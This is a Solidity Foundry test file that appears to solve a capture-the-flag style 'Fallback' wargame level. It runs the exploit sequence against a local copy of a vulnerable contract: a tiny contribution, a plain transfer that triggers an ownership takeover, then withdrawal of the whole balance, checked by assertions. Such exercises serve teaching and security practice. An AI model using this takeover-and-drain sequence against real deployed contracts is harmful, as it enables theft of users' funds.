// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/attacks/FallbackAttack.sol";

contract FallbackTest is Test {
    Fallback target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        target = new Fallback();
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        vm.startPrank(attacker);

        target.contribute{value: 1 wei}();

        (bool success, ) = address(target).call{value: 1 wei}("");
        require(success, "Transfer failed");

        target.withdraw();

        vm.stopPrank();

        assertEq(target.owner(), attacker, "Failure: Attacker is not the owner");
        assertEq(address(target).balance, 0, "Failure: Contract is not empty");
    }
}